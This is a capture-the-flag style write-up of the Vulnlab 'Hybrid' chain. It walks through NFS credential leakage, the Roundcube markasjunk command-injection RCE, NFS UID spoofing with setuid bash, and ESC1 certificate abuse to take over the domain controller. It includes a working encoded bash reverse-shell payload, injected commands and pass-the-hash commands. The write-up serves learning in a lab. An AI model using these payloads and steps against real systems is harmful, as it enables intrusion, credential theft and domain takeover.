---
title: Hybrid - Vulnlab
date: 2024-06-05 14:27:16
tags: [vulnlab, Easy, CHAIN]
categories: vulnlab
keywords: 'Vulnlab, Easy, Linux, Windows'
description: This chain was relatively fun and allowed me to learn a lot of different tactics that I would've previously not known how to do before. It involves attempting to gain initial access to a domain-joined Linux machine, following a pivot to the DC using ADCS.
cover: /images/vulnlab/hybrid-vl/hybrid_slide.png
top_img: /images/cyberpunk-red.jpg
toc: true
toc_number: false
---

This chain was relatively fun and allowed me to learn a lot of different tactics that I would've previously not known how to do before. It involves attempting to gain initial access to a domain-joined Linux machine, following a pivot to the DC using ADCS.

# Enumeration

Running our NMAP scanning to discover both machines `10.10.242.85` and `10.10.242.86`.

```
┌──(daz㉿LAPTOP-VA8M33JK)-[~/tech/vl/hybrid]
└─$ cat initial_scan.txt
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-29 00:38 EDT
Nmap scan report for 10.10.231.245
Host is up (0.095s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-03-29 04:39:03Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: hybrid.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc01.hybrid.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.hybrid.vl
| Not valid before: 2023-06-17T14:05:41
|_Not valid after:  2024-06-16T14:05:41
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: hybrid.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.hybrid.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.hybrid.vl
| Not valid before: 2023-06-17T14:05:41
|_Not valid after:  2024-06-16T14:05:41
|_ssl-date: TLS randomness does not represent time
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: hybrid.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc01.hybrid.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.hybrid.vl
| Not valid before: 2023-06-17T14:05:41
|_Not valid after:  2024-06-16T14:05:41
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: hybrid.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.hybrid.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.hybrid.vl
| Not valid before: 2023-06-17T14:05:41
|_Not valid after:  2024-06-16T14:05:41
|_ssl-date: TLS randomness does not represent time
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=dc01.hybrid.vl
| Not valid before: 2024-03-28T04:09:07
|_Not valid after:  2024-09-27T04:09:07
| rdp-ntlm-info:
|   Target_Name: HYBRID
|   NetBIOS_Domain_Name: HYBRID
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: hybrid.vl
|   DNS_Computer_Name: dc01.hybrid.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2024-03-29T04:39:51+00:00
|_ssl-date: 2024-03-29T04:40:31+00:00; 0s from scanner time.
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022 (89%)
Aggressive OS guesses: Microsoft Windows Server 2022 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2024-03-29T04:39:54
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required

TRACEROUTE (using port 139/tcp)
HOP RTT      ADDRESS
1   94.83 ms 10.8.0.1
2   95.02 ms 10.10.231.245

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 104.10 seconds
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-29 00:40 EDT
Nmap scan report for 10.10.231.246
Host is up (0.094s latency).
Not shown: 990 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 60:bc:22:26:78:3c:b4:e0:6b:ea:aa:1e:c1:62:5d:de (ECDSA)
|_  256 a3:b5:d8:61:06:e6:3a:41:88:45:e3:52:03:d2:23:1b (ED25519)
25/tcp   open  smtp     Postfix smtpd
|_smtp-commands: mail01.hybrid.vl, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, AUTH PLAIN LOGIN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, CHUNKING
80/tcp   open  http     nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Redirecting...
110/tcp  open  pop3     Dovecot pop3d
| ssl-cert: Subject: commonName=mail01
| Subject Alternative Name: DNS:mail01
| Not valid before: 2023-06-17T13:20:17
|_Not valid after:  2033-06-14T13:20:17
|_pop3-capabilities: AUTH-RESP-CODE TOP STLS UIDL PIPELINING SASL RESP-CODES CAPA
|_ssl-date: TLS randomness does not represent time
111/tcp  open  rpcbind  2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      37551/udp6  mountd
|   100005  1,2,3      49714/udp   mountd
|   100005  1,2,3      50857/tcp6  mountd
|   100005  1,2,3      53003/tcp   mountd
|   100021  1,3,4      34841/tcp   nlockmgr
|   100021  1,3,4      35283/tcp6  nlockmgr
|   100021  1,3,4      37554/udp   nlockmgr
|_  100021  1,3,4      45267/udp6  nlockmgr
143/tcp  open  imap     Dovecot imapd (Ubuntu)
|_imap-capabilities: IMAP4rev1 LOGIN-REFERRALS more SASL-IR STARTTLS ID LOGINDISABLEDA0001 have post-login Pre-login ENABLE LITERAL+ listed IDLE OK capabilities
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=mail01
| Subject Alternative Name: DNS:mail01
| Not valid before: 2023-06-17T13:20:17
|_Not valid after:  2033-06-14T13:20:17
587/tcp  open  smtp     Postfix smtpd
|_smtp-commands: mail01.hybrid.vl, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, AUTH PLAIN LOGIN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, CHUNKING
993/tcp  open  ssl/imap Dovecot imapd (Ubuntu)
| ssl-cert: Subject: commonName=mail01
| Subject Alternative Name: DNS:mail01
| Not valid before: 2023-06-17T13:20:17
|_Not valid after:  2033-06-14T13:20:17
|_imap-capabilities: IMAP4rev1 LOGIN-REFERRALS more SASL-IR OK ID Pre-login have post-login ENABLE capabilities LITERAL+ listed IDLE AUTH=LOGINA0001 AUTH=PLAIN
|_ssl-date: TLS randomness does not represent time
995/tcp  open  ssl/pop3 Dovecot pop3d
|_pop3-capabilities: AUTH-RESP-CODE TOP USER UIDL PIPELINING SASL(PLAIN LOGIN) RESP-CODES CAPA
| ssl-cert: Subject: commonName=mail01
| Subject Alternative Name: DNS:mail01
| Not valid before: 2023-06-17T13:20:17
|_Not valid after:  2033-06-14T13:20:17
|_ssl-date: TLS randomness does not represent time
2049/tcp open  nfs      3-4 (RPC #100003)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=3/29%OT=22%CT=1%CU=30324%PV=Y%DS=2%DC=T%G=Y%TM=6606
OS:4698%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=107%TI=Z%CI=Z%II=I%TS=A)
OS:OPS(O1=M4D4ST11NW7%O2=M4D4ST11NW7%O3=M4D4NNT11NW7%O4=M4D4ST11NW7%O5=M4D4
OS:ST11NW7%O6=M4D4ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)
OS:ECN(R=Y%DF=Y%T=40%W=F507%O=M4D4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%
OS:F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T
OS:5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=
OS:Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF
OS:=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40
OS:%CD=S)

Network Distance: 2 hops
Service Info: Host:  mail01.hybrid.vl; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 5900/tcp)
HOP RTT      ADDRESS
1   95.17 ms 10.8.0.1
2   95.26 ms 10.10.231.246

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 87.40 seconds
```

We can see here that there seems to be a Windows and a Linux machine, which probably hints at the fact that we are going to have to mess around with a domain-joined Linux machine.

The Windows machine appears to be the DC as the domain name for it is `dc01.hybrid.vl`, which means we'll turn our attention to the Linux machine first.

There seems to be an HTTP web server that is redirecting us somewhere. I also noticed that this machine's domain name is `mail01.hybrid.vl`, so we'll change this in our host file.

![](/images/vulnlab/hybrid-vl/b.jpg)

This brings us to a Roundcube email login page, which we'll probably need to find credentials for.

# External NFS Mounts

Before we mess with anything, I want to turn our attention to another potential vulnerable service on the machine - NFS.

NFS is a file sharing service, much like CIFS(which essentially is SMB). Instead of directly viewing the shares through a command-line interface, we can use NFS to potentially view public shares and mount them to our machine.

In order to view the different mounts on NFS, we can browse the NFS interface using `showmount`
`showmount -e 10.10.242.86`

To which we'll receive the following output:
```
Export list for 10.10.242.86:
/opt/share *
```

This means that we should be able to view all the contents of the `/opt/share` NFS share by mounting it to our machine.

`sudo mount -t nfs -o vers=3 10.10.231.246:/opt/share /mnt/tmpmnt -o nolock`
* `mount -t nfs` to specifically mount an NFS share.
* `-o vers=3` due to our NMAP scan, which denoted the NFS version as 3 or 4.
* `10.10.231.246:/opt/share /mnt/tmpmnt` mounting everything is `/opt/share` to `/mnt/tmpmnt`, which is a directory that will be created on our local machine.
* `-o nolock` to disable file-locking, which prevents the execution of binaries on the NFS share.

Within the contents of `/tmp/tmpmnt`, we can see a file called `backup.tar.gz`. We can unzip this with `tar` - `tar -xzf backup.tar.gz`. This gives us access to both `etc` and `opt` directories in the file archive.

Upon enumerating the boxes, I've found an file that seems to give us credentials to the Roundcube login. This file is `/etc/dovecot/dovecot-users`
```
admin@hybrid.vl:{plain}Duckling21
peter.turner@hybrid.vl:{plain}PeterIstToll!
```

Using these credentials (I'll use the admin's credentials), we are able to log in to the Roundcube instance.

![](/images/vulnlab/hybrid-vl/c.png)

# MarkasJunk RCE

Upon looking around, I've stumbled across an email that `admin` has sent to `peter.turner`, entailing that they'll be enabling a Junk plugin on the Roundcube server.

![](/images/vulnlab/hybrid-vl/d.png)

Not only that, but it seems we have another user named `Ed` who we might potentially get access to later. Just something to note down.

This points us to our attack path to get foothold - RCE.

Upon doing some research on this junk filter plugin, I found record of a CVE that allows you to get unauthorized remote code execution by configuring the user's name, sending an email, and then sending the mail to the junk folder. https://ssd-disclosure.com/ssd-advisory-roundcube-markasjunk-rce/

This essentially allows us to trigger an arbitrary command in the user's name due to a lack of filtering when this version of Roundcube is parsing an email. The article provided above entails the specifics on why this is the case, however it's really just important to note right now that we can execute commands by adding a `&` before and after our command in our email name so that Roundcube parses it incorrectly.

Let's head over to `Compose > Edit Identities` (the little pencil icon next to our email) to perform this exploit.

If we try to add a command regularly as we interpreted above, such as:

`admin&curl http://10.8.0.173:9001/&@hybrid.vl`

Roundcube will tell us that our email address is invalid. While we could spend more time trying to understand specifically what characters it has on its blacklist, we can instead just push our commands in base64. I also found success in doing this in Burpsuite and URL encoding all special characters. This can be done in Burpsuite by capturing the request and then editing the `email` value.

After messing around with a `curl` test payload, I managed to develop the following:

The command we are trying to execute is `curl http://10.8.0.173`, which I'm using to see if we can generate a callback to a simple Python server I'll stand up on our local machine. This brings us to the example name I've constructed below.
`admin&echo${IFS}Y3VybCBodHRwOi8vMTAuOC4wLjE3Mzo5MDAxLwo=|base64${IFS}-d|bash&@hybrid.vl`

We'll also want to URL encode any characters so they can bypass any blacklists that Roundcube is attempting to detect on the front-end, and also so that Burpsuite can parse them correctly.
`admin%26echo${IFS}Y3VybCBodHRwOi8vMTAuOC4wLjE3Mzo5MDAxLwo%3d|base64${IFS}-d|bash%26%40hybrid.vl`

![](/images/vulnlab/hybrid-vl/e.png)

Upon submitting the request, we can see that our name is accepted despite having special characters in it.

![](/images/vulnlab/hybrid-vl/f.png)

Let's compose an email now and send it back to ourselves to exploit the plugin. (All I did was compose an email and send it to `admin@hybrid.vl`).

Additionally, on my local machine, I'll start a simple python server on port `9001` to receive the request. `python3 -m http.server 9001`

![](/images/vulnlab/hybrid-vl/g.png)

We'll now browse to the email in our inbox after sending it and click the `Junk` icon on the top of the email.

![](/images/vulnlab/hybrid-vl/i.png)

Upon clicking this, we can see that a GET request was sent from `10.10.242.86` back to our local machine. This means that we can execute commands and get a reverse shell on the target machine.
  
![](/images/vulnlab/hybrid-vl/j.png)

Let's develop our command that we want to run, in this case I just used `Revshells.com` to generate a bash one-liner.

We'll also combine what we know previously to craft the following payload. Let's also set up a `netcat` listener to catch the web request and get us a shell. Command we are trying to run: `/bin/bash -i >& /dev/tcp/10.8.0.173/9001 0>&1`
`admin%26echo${IFS}L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjguMC4xNzMvOTAwMSAwPiYx|base64${IFS}-d|bash%26%40hybrid.vl`

If we do all of the same steps as outlined previously and use the `Junk` plugin in a new email, we can see that a reverse shell was spawned as user `wwwdata`.

![](/images/vulnlab/hybrid-vl/q.png)

# Internal Mounted NFS Exploit

Looking around the box initially, there wasn't anything that I saw that screamed out at me out of the blue. I ended up dropping `Linpeas` to the box through a Sliver C2 beacon that I created, but didn't really see anything with it either.

Upon searching some more, I decided to turn our attention back to NFS to potentially find any vulnerabilities with it. We can find the configurations for NFS in `/etc/export`

```
# /etc/exports: the access control list for filesystems which may be exported
#		to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#
/opt/share *(rw,no_subtree_check)  
```

While normally we'd look for NFS privilege escalation vectors such as `no_root_squash`, we can actually exploit the `rw` parameter that is set to `/opt/share`. https://www.hackingarticles.in/linux-privilege-escalation-using-misconfigured-nfs/

This next exploit goes into depth on how NFS interprets the `rw` setting and by also exploiting `peter.turner@hybrid.vl`'s UID. If we run a `id` scan on `peter.turner@hybrid.vl`, we can see that they have a UID of `902601108`.

```
www-data@mail01:~/roundcube$ id peter.turner@hybrid.vl
id peter.turner@hybrid.vl
uid=902601108(peter.turner@hybrid.vl) gid=902600513(domain users@hybrid.vl) groups=902600513(domain users@hybrid.vl),902601104(hybridusers@hybrid.vl)
```

If we create a user with the same UID, we can potentially exploit the `/bin/bash` binary by setting the sticky bit of `bash` and running it in the context of `peter.turner@hybrid.vl`. But how exactly does that make sense? Are we running `/bin/bash` as `peter.turner@hybrid.vl`? Yes and no. We're going to try and run `/bin/bash` as a user with the SAME UID as `peter.turner@hybrid.vl`. Meaning, if we create the same user on our local machine and modify the privileges to it using `rw`, we can run it in the context of `peter.turner@hybrid.vl`.

So to do this, we need to do the following:
* Remote Host: `cp /bin/bash /opt/share/`
	* Copying the `/bin/bash` executable into the NFS share.
* Local Host: `sudo useradd peter.turner@hybrid.vl -u 902601108`
	* Creating a user named `peter.turner@hybrid.vl` with the same UID as the UID on the remote machine.
	* NOTE: We will need to edit `/etc/login.defs` and change `UID_MAX` to a value greater than `902601108`.
* Local Host: `sudo su -l peter.turner@hybrid.vl`
	* Logging into the new user we created.*
* Local Host: `sudo mount -t nfs -o vers=3 10.10.231.246:/opt/share /mnt/tmpmnt -o nolock`
	* Mounting the NFS share to `/mnt/tmpmnt` once more.
* Local Host: `cp /mnt/tmpmnt/bash /tmp/tmpbash/`
	* Copying the `bash` executable to a temporary directory just so we can reset the privileges of the binary/
* Remote Host: `rm /opt/share/bash`
	* Removing the `bash` executable from the remote machine so that we can replace it with a newly configured bash executable.
* Local Host: `cp /tmp/tmpbash/bash /mnt/tmpmnt/`
	* Copying our executable back into the NFS share.
* Local Host: `chmod +s /mnt/tmpmnt/bash`
	* Configuring the sticky bit of the `bash` executable. By configuring this privilege, it is essentially saying that any user that runs this binary will run it as the context of that user.
* Remote Host: `/opt/share/bash -p`
	* We are running the `bash` binary with `-p`, which stands for `privileged mode`. This essentially means that it will set the effective user ID (EUID) to the real user ID. The binary will run with the permissions of the same user who invoked it based on the user ID. (In this case, `peter.turner@hybrid.vl`)

This should give us a shell as `peter.turner@hybrid.vl`, as denoted below.

![](/images/vulnlab/hybrid-vl/r.png)

The only problem with having this type of shell is that we can't upgrade our shell in any way at the moment. Any attempt to do so will revert us back to `www-data`. That being said, I'll upload a Sliver C2 implant so we can download and upload files whenever we need to.

# Reading KDBX

In the home directory, we can find the first flag to this chain as well as a `passwords.kdbx` file. We can use `kpcli` to open this file and read its contents.

You'll notice that if you try to show the `domain` entry, it will be blotted it in red. Copying this to any text file will reveal the real contents. An alternative is to use `KeaPassXC` if you're on Windows, though `kpcli` works fine as well.

```
kpcli:/> open passwords.kdbx
kpcli:/> ls
=== Groups ===
eMail/
Internet/
hybrid.vl/

kpcli:/> cd hybrid.vl
kpcli:/> ls

=== Entries ===
0. domain                                                                 
1. mail                                                   mail01.hybrid.vl

kpcli:/> show domain

 Path: /hybrid.vl/
Title: domain
Uname: peter.turner
 Pass: b0cwR+G4Dzl_rw
  URL: 
Notes: 
```

Upon testing these credentials to SSH on the machine, we can see that we have access through SSH as `peter.turner@hybrid.vl`. Slight note, my IP address did change since I took a break in between doing this.

![](/images/vulnlab/hybrid-vl/s.png)

Upon checking for privileges that we can exploit, it seems that this user can run all commands as `sudo`, which is a nice change of pace for once.

```
peter.turner@hybrid.vl@mail01:~$ sudo -l
[sudo] password for peter.turner@hybrid.vl: 
Matching Defaults entries for peter.turner@hybrid.vl on mail01:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User peter.turner@hybrid.vl may run the following commands on mail01:
    (ALL) ALL
peter.turner@hybrid.vl@mail01:~$ sudo su
root@mail01:/home/peter.turner@hybrid.vl# cd /root
root@mail01:~# ls
flag.txt  snap
```

The flag is in the `/root` directory as shown above, meaning we have compromised the first machine for this chain.

# Pivoting to DC

For the next box, I'm assuming that we'll be able to start enumerating the machine with `peter.turner`'s valid credentials.

There is LDAP and SMB on the machine, so we could potentially verify whether this user is able to access anything. `crackmapexec smb 10.10.194.118 -u 'peter.turner' -p 'b0cwR+G4Dzl_rw'

```
SMB         10.10.194.117   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hybrid.vl) (signing:True) (SMBv1:False)
SMB         10.10.194.117   445    DC01             [+] hybrid.vl\peter.turner:b0cwR+G4Dzl_rw

SMB         10.10.194.117   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hybrid.vl) (signing:True) (SMBv1:False)
LDAP        10.10.194.117   445    DC01             [-] hybrid.vl\peter.turner:b0cwR+G4Dzl_rw Error connecting to the domain, are you sure LDAP service is running on the target ?
```

We'll enumerate the SMB instance first to see if we can find anything. `smbclient -L 10.10.194.117 -U 'peter.turner'`

```
Password for [WORKGROUP\peter.turner]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share
```

Seems like everything on SMB is relatively normal. NETLOGON and SYSVOL are normal shares, and we can't access any of the other shares. Just to verify though, I did go into NETLOGON and SYSVOL to ensure there wasn't anything there, which there wasn't.

The error we had before with LDAP is an error I've ran into before - we know that LDAP is running on the target based on the NMAP scan. Let's try and use `bloodhound-python` to enumerate the LDAP forest.
`git clone https://github.com/dirkjanm/BloodHound.py.git`
`python3 bloodhound.py -d 'hybrid.vl' -u 'peter.turner' -p 'b0cwR+G4Dzl_rw' -c all -ns 10.10.194.117 --zip`

This will dump the LDAP forest for us, and any valid domain objects that it can find based on the credentials that we have.

```
INFO: Found AD domain: hybrid.vl
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.hybrid.vl
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: dc01.hybrid.vl
INFO: Found 14 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: mail01
INFO: Querying computer: dc01.hybrid.vl
WARNING: Could not resolve: mail01: The resolution lifetime expired after 3.102 seconds: Server Do53:10.10.194.117@53 answered The DNS operation timed out.
INFO: Done in 00M 19S
INFO: Compressing output into 20240425021728_bloodhound.zip
```

We can now use `bloodhound` with the compressed archive we just received to enumerate the LDAP forest. In case you have never used Bloodhound or Neo4J before, here's a resource to get started: https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-with-bloodhound-on-kali-linux

Upon uploading the data into Bloodhound, we can begin to enumerate if `peter.turner` has delegation over anything.

One thing I do want to note, there seems to be a user which we saw in the Roundcube instance named Ed. His full username seems to be `edward.miller@hybrid.vl`. I'm assuming we'll need to compromise him somehow, but that's still uphill. Bloodhound doesn't seem to note anything down at the moment for `peter.turner`'s privileges, so let's see what users we can find in the users file that Bloodhound dumped originally.

I've compromised a list of these users based on the JSON that was provided, and modified it into a wordlist based on the user.

```
ADMINISTRATOR@HYBRID.VL
GUEST@HYBRID.VL
KRBTGT@HYBRID.VL
EDWARD.MILLER@HYBRID.VL
PAMELA.SMITH@HYBRID.VL
JOSH.MITCHELL@HYBRID.VL
PETER.TURNER@HYBRID.VL
OLIVIA.SMITH@HYBRID.VL
RICKY.MYERS@HYBRID.VL
EMILY.WHITE@HYBRID.VL
ELLIOT.WATKINS@HYBRID.VL
KATHLEEN.WALKER@HYBRID.VL
MARGARET.SHEPHERD@HYBRID.VL
```

```
Administrator
Guest
krbtgt
edward.miller
pamela.smith
josh.mitchell
peter.turner
olivia.smith
ricky.myers
emily.white
elliot.watkins
kathleen.walker
margaret.shepherd
```

Didn't seem like we could dump any `ASREP` hashes with `GetNPUsers`, nor could we dump any usable TGSs/TGTs for any of the users with `GetUserSPNs`.

Let's turn our attention to another avenue we could target, ADCS.

# ESC1 ADCS Exploitation

ADCS is a server role that essentially allows you to integrate PKI (Public Key Infrastructure) into an AD environment. This helps to maintain public key cryptography and digital signature/certificate capabilities. ADCS vulnerabilities can allow us to request a certificate used to authenticate on behalf of another user in the domain. Let's try to find any vulnerable certificate templates that we can use.

`certipy-ad find -vulnerable -username 'peter.turner'@hybrid.vl -password b0cwR+G4Dzl_rw -dc-ip 10.10.194.117`

We'll see that this returns one result of a vulnerable certificate denoted as `HybridComputers`

```
Certificate Templates
  0
    Template Name                       : HybridComputers
    Display Name                        : HybridComputers
    Certificate Authorities             : hybrid-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : None
    Private Key Flag                    : 16842752
    Extended Key Usage                  : Client Authentication
                                          Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 100 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 4096
    Permissions
      Enrollment Permissions
        Enrollment Rights               : HYBRID.VL\Domain Admins
                                          HYBRID.VL\Domain Computers
                                          HYBRID.VL\Enterprise Admins
      Object Control Permissions
        Owner                           : HYBRID.VL\Administrator
        Write Owner Principals          : HYBRID.VL\Domain Admins
                                          HYBRID.VL\Enterprise Admins
                                          HYBRID.VL\Administrator
        Write Dacl Principals           : HYBRID.VL\Domain Admins
                                          HYBRID.VL\Enterprise Admins
                                          HYBRID.VL\Administrator
        Write Property Principals       : HYBRID.VL\Domain Admins
                                          HYBRID.VL\Enterprise Admins
                                          HYBRID.VL\Administrator
    [!] Vulnerabilities
      ESC1                              : 'HYBRID.VL\\Domain Computers' can enroll, enrollee supplies subject and template allows client authentication
```

You'll notice the `ESC1` vulnerability indicator at the bottom of the template, which is telling us that `Domain Computers` can enroll supplies subject and also allows client authentication. This essentially means that any user can request a certificate on behalf of any other user in the network, even if that user is a privileged user (such as `Administrator`).

So technically speaking, we can use our `peter.turner` credentials to generate a certificate on behalf of `Administrator`, right? Unfortunately, it's not that simple in our case.
As you can see, the only role that can do this is `HYBRID.VL\\Domain Computers`, which means that only domain computers can perform this.

Now this is relatively easy to move around, as we already have control of another computer on the domain - the recent `MAIL01` computer that we just compromised previously. We'll need to find the NTLM hash of this domain computer, which we would normally just dump through tools such as `mimikatz` on a Windows machine. On a Domain-joined Linux machine, the NTLM hashes for the domain computer can usually be found in `/etc/krb5.keytab` in my experience.

![](/images/vulnlab/hybrid-vl/t.png)

Upon trying to read the file, we'll find out that it's unreadable since it is encrypted.
We can easily circumvent this by using a tool called `keytabextract.py`, which will dump the contents of this file in plaintext. https://github.com/sosdave/KeyTabExtract

![](/images/vulnlab/hybrid-vl/u.png)

We can now use this NTLM hash to proceed with our certificate request.
`certipy-ad req -u 'MAIL01$'@hybrid.vl -hashes '0f916c5246fdbc7ba95dcef4126d57bd' -ca 'hybrid-DC01-CA' -template HybridComputers -target hybrid.vl -upn 'administrator@hybrid.vl' -dns dc01.hybrid.vl -key-size 4096 -debug`

Once again as a reminder, make sure that `dc01.hybrid.vl` and `hybrid.vl` both are set to the IP address of the DC in your `/etc/hosts` file. Just a reminder.
This should save a certificate and private key to a file called `administrator_dc01.pfx`. We can use this `.pfx` to now authenticate to the DC and dump the Administrator's NT hash.

`certipy-ad auth -pfx administrator_dc01.pfx -username 'administrator' -domain 'hybrid.vl' -dc-ip 10.10.238.53`
This will dump the NT hash in plaintext, to which we'll use the second part of the hash to authenticate.

![](/images/vulnlab/hybrid-vl/v.png)

Let's test our ability to authenticate to WinRM with these credentials using Pass-the-Hash on CrackMapExec.
`crackmapexec winrm 10.10.238.53 -u 'Administrator' -H '60701e8543c9f6db1a2af3217386d3dc'`

```
SMB         10.10.238.53    5985   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:hybrid.vl)
HTTP        10.10.238.53    5985   DC01             [*] http://10.10.238.53:5985/wsman
WINRM       10.10.238.53    5985   DC01             [+] hybrid.vl\Administrator:60701e8543c9f6db1a2af3217386d3dc (Pwn3d!)
```

That `Pwn3d!` notification denotes that we can now access the machine through WinRM.
`evil-winrm --ip 10.10.238.53 -u 'Administrator' -H '60701e8543c9f6db1a2af3217386d3dc'`

![](/images/vulnlab/hybrid-vl/w.png)

The root flag is within the Administrator's `Desktop` directory, meaning we now have completed this chain!

# Conclusion

This machine was an awesome first experience at chains. Given that it was a domain-joined Linux, it required much more research into the attack path as I wasn't very familiar with this type of machine. It was a nice curveball, and the ADCS exploitation made it even more enjoyable. Big thanks goes out to xct for the development of this chain.

# Resources

https://ssd-disclosure.com/ssd-advisory-roundcube-markasjunk-rce/
https://www.hackingarticles.in/linux-privilege-escalation-using-misconfigured-nfs/
https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-with-bloodhound-on-kali-linux
https://github.com/sosdave/KeyTabExtract
